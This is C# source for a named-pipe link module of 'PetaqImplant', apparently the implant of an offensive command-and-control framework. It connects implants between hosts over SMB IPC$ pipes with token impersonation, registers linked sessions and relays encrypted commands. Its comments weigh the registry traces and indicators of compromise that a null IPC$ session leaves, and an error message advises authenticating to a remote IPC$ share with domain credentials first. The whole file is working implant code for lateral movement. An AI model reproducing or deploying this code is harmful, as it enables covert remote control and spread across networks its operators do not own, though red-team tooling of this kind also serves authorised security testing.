using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.WebSockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.IO;
using System.IO.Pipes;
using System.Security.Principal;
using System.Security.AccessControl;

namespace PetaqImplant
{
    public class NamedPipeClientSocket : LinkedImplantSocket
    {
        public NamedPipeClientStream NamedPipeClientRead { get; set; }
        public StreamString NamedPipeClientReadStream { get; set; }
        public NamedPipeClientStream NamedPipeClientWrite { get; set; }
        public StreamString NamedPipeClientWriteStream { get; set; }
        public string NamedPipeServiceName = Program.configuration["NAMEDPIPE"];


        public override void Connect(string sid, string sa, string option = null)
        {
            Console.Error.WriteLine("Named Pipe is linking.");

            ServerAddress = sa;
            sessionId = sid;

            // Starting the Named Pipe Connection as a thread
            clientThread = new Thread(() =>
            {
                try
                {
                    // Reurposed from the Microsoft sample implementation
                    // https://docs.microsoft.com/en-us/dotnet/standard/io/how-to-use-named-pipes-for-network-interprocess-communication

                    // Custom Named Pipe name support
                    if (option != null) { NamedPipeServiceName = option; }

                    Console.Error.WriteLine("Named pipes are defining.");

                    // Creating the Named Pipe objects
                    NamedPipeClientRead = new NamedPipeClientStream(ServerAddress, NamedPipeServiceName+"o",
                        PipeDirection.InOut, PipeOptions.Asynchronous,
                        TokenImpersonationLevel.Impersonation);
                    NamedPipeClientWrite= new NamedPipeClientStream(ServerAddress, NamedPipeServiceName + "i",
                        PipeDirection.InOut, PipeOptions.Asynchronous,
                        TokenImpersonationLevel.Impersonation);

                    // As the Named Pipes on the network only accessible
                    // via SMB IPC$ connections established
                    // we need to connect to the remote server IPC$
                    // if necessary with the creds
                    //
                    // This points out that named pipe over network
                    // with null IPC $ is possible
                    // However, the pipe name should appear on the registry
                    // which creates traces, IOCs
                    // https://support.microsoft.com/en-au/help/813414/how-to-create-an-anonymous-pipe-that-gives-access-to-everyone

                    Console.Error.WriteLine("Named pipes on {0} are connecting.",ServerAddress);

                    // Connecting to the Named Pipes
                    NamedPipeClientRead.Connect();
                    NamedPipeClientWrite.Connect();
                    Status = true;

                    // Register linked implants as registration started
                    Console.WriteLine("Session {0} is added to the linked sessions.", sessionId);
                    Program.RegisterLinkedImplants();

                    Console.Error.WriteLine("Streams are building.");

                    // Creating StreamStrings class for string based communications
                    NamedPipeClientReadStream = new StreamString(NamedPipeClientRead);
                    NamedPipeClientWriteStream = new StreamString(NamedPipeClientWrite);

                    // Request registration first
                    if (!Registration)
                    {
                        // Requesting the registration 
                        AskRegistration();
                    }
                    Console.WriteLine("Registration asked.");

                    //Ask route updates
                    //AskRouteUpdates();
                    //Console.WriteLine("Route updates is requesting...");
                    //Send(Common.Encrypt("routeupdates"));
                    //Console.Error.WriteLine("Route update is requested. Status {0}", Status);

                    Console.Error.WriteLine("Read loop is starting...");

                    // Read Pipe stream as string and process
                    while (Status)
                    {
                        Console.Error.WriteLine("Listening to the pipe for data.");

                        // Reading the data from the socket
                        string output = NamedPipeClientReadStream.ReadString();

                        Console.Error.WriteLine("Data received:\n{0}", Common.Decrypt(output));

                        // Process the data and send to the linked service
                        LinkedServiceSend(output);

                        // Asking route updates makes the service unresponsive
                        // Maybe waiting for a grace period would work
                        //
                        // Request route after the first response
                        //if (!Route)
                        //{
                        //    // Requesting the registration 
                        //    AskRouteUpdates();
                        //    Console.WriteLine("Route updates asked.");

                        //}


                    }
                    Console.Error.WriteLine("Stopping listen to the pipe for data.");

                }
                catch (Exception e)
                {
                    string warn = "\nInvalid credentials error may occur if the logged on user has no access to remote server IPC$. Try this before linking 'net use \\\\servername\\IPC$ /user:domain\\user password'. Named pipe would accept null IPC$, though, but this time it leaves traces on the registry.";

                    Console.WriteLine("{0}\nNamed Pipe Client Exception on Connect/Receive: {1}", warn, e.Message);

                }
                finally
                {
                    // Dispose the Named pipe after use
                    Disconnect();
                }
            });
            clientThread.Start();
        }

        public override void Disconnect()
        {
            if (Status)
            {
                //Flushing the NamedPipes
                NamedPipeClientRead.Close();
                NamedPipeClientWrite.Close();
                Status = false; // setting the status to false
                Program.RegisterLinkedImplants();
            }
            else
            {
                Console.WriteLine("The Named Pipe is not connected.");
            }
        }


        public override bool Send(string data = "")
        {
            if (data == "") return false;
            try
            {
                if (Status)
                {
                    Console.Error.WriteLine("Data sending:\n{0}", Common.Decrypt(data));

                    //Data is writing to the Named client pipe...
                    NamedPipeClientWriteStream.WriteString(data);
                }
                else
                {
                    Console.WriteLine("The Named Pipe is not connected.");
                }                
                return true;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("Named Pipe Client Exception on Send: " + e.Message);
                Status = false; // setting the status to false
                return false;
            }

        }

    }
}
